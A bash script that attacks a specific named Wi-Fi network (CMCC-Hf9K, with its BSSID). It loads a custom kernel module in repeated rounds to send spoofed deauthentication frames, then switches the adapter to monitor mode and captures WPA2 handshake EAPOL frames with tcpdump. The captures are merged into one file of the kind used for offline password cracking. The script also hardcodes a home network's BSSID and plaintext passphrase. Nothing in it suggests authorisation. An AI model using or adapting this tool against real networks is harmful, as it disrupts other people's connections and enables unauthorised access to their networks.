#!/bin/bash
# capture_cmcc2.sh - Deauth CMCC-Hf9K and capture WPA2 handshake
#
# Monitor mode: delete wlan0 + recreate as monitor (driver doesn't support iw set type)
#
# Usage: sudo bash /tmp/capture_cmcc2.sh [rounds]

ROUNDS=${1:-10}
BURST=5
TARGET_BSSID_24="86:1A:24:58:59:1C"
TARGET_BSSID_24_LC="86:1a:24:58:59:1c"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"
PCAP="/tmp/cmcc_hs.pcap"
CAPTURE_SECONDS=10

echo "[*] CMCC-Hf9K handshake capture - $ROUNDS rounds"

cd /tmp

# Build petx5 if needed
if [ ! -f petx5.ko ] || [ petx5.S -nt petx5.ko ]; then
    echo "[*] Building petx5.ko..."
    as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o || { echo "BUILD FAIL"; exit 1; }
fi

rm -f "$PCAP" "${PCAP}".part*

TOTAL_DEAUTH=0
TOTAL_EAPOL=0

for round in $(seq 1 $ROUNDS); do
    echo ""
    echo "========== Round $round/$ROUNDS =========="

    # ---- DEAUTH PHASE ----
    echo "[DEAUTH] Connecting to CMCC-Hf9K..."

    # Make sure managed mode
    nmcli device set wlan0 managed yes 2>/dev/null
    nmcli device disconnect wlan0 2>/dev/null
    sleep 0.3

    CONN_BEFORE=$(dmesg | grep -c "connected to 86:1a:24:5[8c]:59:1c")

    nmcli device wifi connect "$TARGET_BSSID_24" password "dummypassword12345678" ifname wlan0 2>/dev/null &
    PID=$!

    OK=0
    CHAN_FREQ=2462
    for i in $(seq 1 80); do
        CONN_NOW=$(dmesg | grep -c "connected to 86:1a:24:5[8c]:59:1c")
        if [ "$CONN_NOW" -gt "$CONN_BEFORE" ]; then
            LAST=$(dmesg | grep "connected to 86:1a:24:5" | tail -1)
            if echo "$LAST" | grep -q "58:59:1c"; then
                CHAN_FREQ=2462
                echo "[DEAUTH] Associated to 2.4GHz (ch11)"
            else
                CHAN_FREQ=5220
                echo "[DEAUTH] Associated to 5GHz (ch44)"
            fi
            OK=1
            break
        fi
        sleep 0.05
    done

    if [ $OK -eq 0 ]; then
        echo "[DEAUTH] FAIL - no association"
        kill $PID 2>/dev/null; wait $PID 2>/dev/null
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 2
        continue
    fi

    # Fire deauth burst
    SENT=0
    for b in $(seq 1 $BURST); do
        rmmod kfind 2>/dev/null
        sleep 0.03
        insmod /tmp/petx5.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            TOTAL_DEAUTH=$((TOTAL_DEAUTH + 1))
            SENT=$((SENT + 1))
            rmmod kfind 2>/dev/null
            sleep 0.06
        else
            break
        fi
    done
    echo "[DEAUTH] Sent $SENT spoofed deauths"

    kill $PID 2>/dev/null; wait $PID 2>/dev/null

    # Cleanup NM profiles
    for prof in $(nmcli -t -f NAME connection show 2>/dev/null | grep -i "cmcc\|86:1A"); do
        nmcli connection delete "$prof" 2>/dev/null
    done

    # ---- CAPTURE PHASE ----
    echo "[CAPTURE] Switching to monitor mode..."

    # Tell NM to stop managing wlan0
    nmcli device set wlan0 managed no 2>/dev/null
    sleep 0.3

    # Delete all interfaces and recreate as monitor
    ip link set wlan0 down 2>/dev/null
    iw dev wlan0 del 2>/dev/null
    iw dev p2p0 del 2>/dev/null
    iw dev wifi-aware0 del 2>/dev/null
    sleep 0.3

    iw phy phy0 interface add mon0 type monitor 2>&1
    RET=$?
    if [ $RET -ne 0 ]; then
        echo "[CAPTURE] FAIL creating monitor interface (err=$RET)"
        # Try to recover - recreate wlan0
        iw phy phy0 interface add wlan0 type managed 2>/dev/null
        ip link set wlan0 up 2>/dev/null
        nmcli device set wlan0 managed yes 2>/dev/null
        sleep 2
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 2
        continue
    fi

    ip link set mon0 up
    iw dev mon0 set freq $CHAN_FREQ
    echo "[CAPTURE] Monitor on freq $CHAN_FREQ - capturing ${CAPTURE_SECONDS}s..."

    # Capture EAPOL + management frames
    PARTFILE="${PCAP}.part${round}"
    timeout $CAPTURE_SECONDS tcpdump -i mon0 -w "$PARTFILE" \
        'ether proto 0x888e or (type mgt subtype deauth) or (type mgt subtype assoc-resp)' \
        2>/dev/null
    sleep 0.5

    # Count EAPOL
    if [ -f "$PARTFILE" ]; then
        EAPOL=$(tcpdump -r "$PARTFILE" 'ether proto 0x888e' 2>/dev/null | wc -l)
        TOTAL_EAPOL=$((TOTAL_EAPOL + EAPOL))
        echo "[CAPTURE] Got $EAPOL EAPOL frames (total=$TOTAL_EAPOL)"
        if [ $EAPOL -gt 0 ]; then
            tcpdump -r "$PARTFILE" -e 'ether proto 0x888e' 2>/dev/null
        fi
    else
        echo "[CAPTURE] No pcap produced"
    fi

    # ---- RESTORE PHASE ----
    echo "[RESTORE] Switching back to managed mode..."
    ip link set mon0 down 2>/dev/null
    iw dev mon0 del 2>/dev/null
    sleep 0.3

    # Recreate managed wlan0
    iw phy phy0 interface add wlan0 type managed 2>/dev/null
    sleep 1
    ip link set wlan0 up 2>/dev/null
    nmcli device set wlan0 managed yes 2>/dev/null
    sleep 1

    # Reconnect home
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    sleep 2

    # Verify home connection
    if ! iw dev wlan0 link 2>/dev/null | grep -q "8c:de:f9"; then
        echo "[RESTORE] Home reconnect failed, retrying..."
        nmcli device wifi rescan 2>/dev/null
        sleep 2
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 3
    fi

    if [ $TOTAL_EAPOL -ge 4 ]; then
        echo "[*] *** Got $TOTAL_EAPOL EAPOL frames - likely have handshake! ***"
        # Don't break early, keep going for reliability
    fi
done

# Merge all part files
echo ""
echo "[*] === MERGING CAPTURES ==="
PARTS=$(ls -1 ${PCAP}.part* 2>/dev/null)
if [ -n "$PARTS" ]; then
    FIRST=$(echo "$PARTS" | head -1)
    REST=$(echo "$PARTS" | tail -n +2)
    cp "$FIRST" "$PCAP"
    if [ -n "$REST" ] && which mergecap >/dev/null 2>&1; then
        mergecap -w "$PCAP" $PARTS 2>/dev/null
    fi
    echo "[*] Merged to $PCAP"
fi

echo ""
echo "[*] === RESULTS ==="
echo "[*] $TOTAL_DEAUTH deauths sent, $TOTAL_EAPOL EAPOL captured"
if [ -f "$PCAP" ]; then
    echo "[*] All EAPOL:"
    tcpdump -r "$PCAP" -e 'ether proto 0x888e' 2>/dev/null
fi
echo "[*] Done."
